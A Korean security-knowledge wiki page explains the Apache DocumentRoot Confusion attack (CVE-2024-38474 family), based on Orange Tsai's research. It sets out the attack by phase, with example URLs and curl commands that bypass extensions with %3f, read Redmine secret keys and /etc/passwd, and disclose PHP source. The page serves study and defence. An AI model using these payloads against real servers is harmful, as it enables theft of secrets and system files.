---
title: Apache DocumentRoot Confusion
description: 
published: true
date: 2025-07-31T17:14:31.921Z
tags: attack success validation, data exfiltration, default acl discovery, symbolic link discovery, file extension bypass, symbolic link path traversal, rewrite confusion, local gadget to lfi, source code disclosure
editor: markdown
dateCreated: 2025-07-23T10:44:43.699Z
---

# Apache DocumentRoot Confusion

## 개요

“Apache DocumentRoot Confusion”은 Apache HTTP Server에서 RewriteRule과 같은 rewrite 모듈이 상대 경로뿐만 아니라 절대 경로도 동시에 해석하며, 서버는 동일한 요청에 대해 DocumentRoot가 적용된 경로와 그렇지 않은 경로를 모두 시도한 뒤 파일을 처리하게 되는 불일치를 악용한 기법이다. 공격자는 이 특성을 이용해 DocumentRoot 상태에서 접근이 차단되더라도 절대 경로 해석을 통해 민감 자원에 접근할 수 있으며, 이를 통해 서버 소스 코드 노출, LFI, SSRF, RCE 등의 보안 문제가 발생할 수 있다.


## 분류

> 구문 분석 불일치 (Syntax Parsing Gap)
> → 경로 파싱 불일치 (Path Parsing Mismatch)
> → Apache DocumentRoot Confusion

## 절차

| Phase          | Description                                                                                 |
| -------------- | ------------------------------------------------------------------------------------------- |
| Reconnaissance | Apache 설정 파일과 .htaccess를 분석해 웹 루트(DocumentRoot) 경로와 mod\_rewrite 규칙을 파악한다.                  |
| Mutation       | 노출 대상 절대 경로(/etc/passwd 등)에 URL 인코딩(%2F, %3F)을 적용해서 파서별로 다르게 해석되도록 요청을 조작한다.                |
| Confusion      | 파싱된 경로가 의도치 않게 /etc/passwd.html? 같은 절대 경로로 바뀌어, 서버가 실제 파일 시스템 최상위 경로를 열어보도록 유도한다.           |
| Validation     | curl -I 등으로 응답 상태 및 헤더를 확인해, 의도한 파일의 실제 동작을 검증한다. 또한 추가적으로 다양한 인코딩 조합, 심볼릭 링크 체인 테스트를 수행한다. |
| Exploitation   | 획득한 파일(설정,키,소스코드 등)을 기반으로 내부 권한 상승, 코드 실행 등을 수행한다.                                          |
| Exfiltration   | 파일 내용을 원격 C2나 로컬에 복사·전송하여 민감 정보를 빼낸다.                                                       |

<div style="text-align: left;">
  <img
    src="/apache_documentroot_confusion.png"
    alt="Apache DocumentRoot Confusion 다이어그램"
    width="1000"
    style="display: block;
           margin: 0 0 1em 0;
           height: auto;"
  />
</div>

## 공격기법

### Reconnaissance

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Default ACL Discovery</td>
      <td>
        <pre><code>&lt;Directory /&gt; Options FollowSymLinks
AllowOverride None
Require all denied
&lt;/Directory&gt;
\&lt;Directory /usr/share&gt; AllowOverride None
Require all granted \&lt;/Directory&gt;</code></pre> </td> <td>서버의 기본 ACL(Access Control List) 설정을 확인한다. 루트(/) 디렉토리는 접근이 거부되지만, /usr/share 디렉토리는 기본적으로 접근이 허용되어 공격의 시작점이 된다.</td> <td>\[1]</td> </tr> <tr> <td>Symbolic Link Discovery</td> <td> <pre><code>/usr/share/redmine/instances/
   ∟ symbolic link to
   /var/lib/redmine/</code></pre> </td> <td>Apache는 기본적으로 심볼릭 링크를 따라가는 설정(Options FollowSymLinks)이 켜져 있다. 이를 이용해 접근 가능한 /usr/share 내부에 존재하는 심볼릭 링크를 찾아 DocumentRoot 외부 경로로 탈출할 수 있는지 확인한다.</td> <td>\[1]</td> </tr>

  </tbody>
</table>

### Mutation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시 페이로드 / 커맨드</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>File Extension Bypass</td>
      <td><code>http://server/html/usr/share/vim/vim81/rgb.txt%3f</code></td>
      <td>RewriteRule이 .html 확장자를 강제하는 경우, URL 끝에 인코딩된 물음표(%3f)를 추가한다. 이는 mod_rewrite가 쿼리 문자열로 인식하게 만들어, .html이 추가되는 것을 막고 원본 파일(.txt)을 읽도록 요청을 조작한다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Symbolic Link Path Traversal</td>
      <td><code>http://server/html/usr/share/redmine/instances/default/config/secret_key.txt%3f</code></td>
      <td>발견된 심볼릭 링크(redmine/instances/)와 경로 순회를 결합하여, DocumentRoot 외부의 민감 파일(secret_key.txt)에 접근하는 최종 공격 페이로드를 구성한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Confusion

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시 페이로드 / 커맨드</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Rewrite Confusion</td>
      <td><code>RewriteRule "^/html/(.*)$" "/$1.html"</code></td>
      <td>mod_rewrite는 재작성된 경로를 처리할 때 DocumentRoot를 적용한 경로와 적용하지 않은 절대 경로 두 가지를 모두 시도한다. 이 불일치로 인해 공격자는 DocumentRoot의 통제를 벗어나 파일 시스템의 절대 경로에 접근할 수 있다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Validation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시 페이로드 / 커맨드</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Response Validation</td>
      <td><code>curl http://server/html/usr/share/redmine/instances/default/config/secret_key.txt%3f</code></td>
      <td>조작된 페이로드로 요청을 보냈을 때, 서버로부터 200 OK 응답과 함께 예상했던 민감 정보(예: Rails Secret Key)가 실제로 응답 본문에 포함되는지 확인하여 공격 성공을 검증한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Exploitation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시 페이로드 / 커맨드</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Local Gadget to LFI</td>
      <td><code>http://www.local/html/usr/share/javascript/jquery-jfeed/proxy.php%3Furl=/etc/passwd&amp;x</code></td>
      <td>/usr/share에 기본 설치된 서드파티 라이브러리(Local Gadget) 중 LFI 취약점이 있는 파일(proxy.php)을 악용하여, 서버의 다른 민감한 파일(예: /etc/passwd)을 읽는다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Source Code Disclosure</td>
      <td><code>curl http://www.local/html/var/www.local/info.php%3f -H "Host: static.local"</code></td>
      <td>DocumentRoot Confusion을 이용해 웹 애플리케이션의 PHP 파일 절대 경로로 직접 요청한다. 이 경우, 웹 서버는 해당 파일을 PHP 핸들러로 처리하지 않고 일반 텍스트로 간주하여 소스 코드 원문이 그대로 노출된다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Exfiltration

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시 페이로드 / 커맨드</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Sensitive Information Exfiltration</td>
      <td><code>curl http://server/html/usr/share/redmine/instances/default/config/secret_key.txt%3f</code></td>
      <td>공격을 통해 접근 가능해진 민감 파일의 내용을 curl과 같은 도구를 사용하여 요청하고, 그 결과를 공격자의 로컬 환경으로 빼낼 수 있다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

## 분류에 해당하는 문서

\[1] [Orange Tsai, “Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server” (DEVCORE 2024)](https://i.blackhat.com/BH-US-24/Presentations/US24-Orange-Confusion-Attacks-Exploiting-Hidden-Semantic-Thursday.pdf)
\[2] Apache HTTP Server 공식 문서]
* mod\_rewrite: [https://httpd.apache.org/docs/2.4/rewrite/](https://httpd.apache.org/docs/2.4/rewrite/)
* core (DocumentRoot 등): [https://httpd.apache.org/docs/2.4/mod/core.html](https://httpd.apache.org/docs/2.4/mod/core.html)

\[3] [https://curl.se/docs/manpage.html](https://curl.se/docs/manpage.html)

## 기타 참고문헌

\[A] [https://httpd.apache.org/docs/2.4/mod/mod\_rewrite.html](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html)
\[B] [https://httpd.apache.org/docs/2.4/mod/core.html#documentroot](https://httpd.apache.org/docs/2.4/mod/core.html#documentroot)
\[C] [https://blog.orange.tw](https://blog.orange.tw)
\[D] CVE-2024-38474, CVE-2024-38475, CVE-2024-38476 (Apache Confusion 관련)
